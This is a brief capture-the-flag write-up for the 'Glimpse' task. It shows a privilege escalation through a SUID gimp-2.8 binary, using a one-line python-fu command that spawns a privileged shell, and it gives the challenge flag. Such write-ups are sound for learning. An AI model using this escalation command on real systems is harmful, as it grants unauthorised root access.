# Glimpse (125pts) 161 solves #

![TASK](https://imgur.com/F78hCi2.png)

We are given some ssh credentials here too , judging from the name of the task i supposed that it might be something unusual with gimp binary so after digging i realised that gimp-2.8 was a suid binary ! BINGO :D

![TASK](https://imgur.com/UgNyqqK.png)

so running the following command we can get a shell from gimp and cat our beloved flag (gtfobins FTW ) :D

```sh
gimp-2.8 -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl("/bin/sh", "sh", "-p")'
```

![TASK](https://imgur.com/bUO0NSt.png)

**Flag:** flag{just_need_a_glimpse_of_the_flag_please}

If you have any questions you can contact me on twitter @BelkahlaAhmed1 or contact our team twitter @FwordTeam ! Make sure to visit my personal blog for more useful content :D
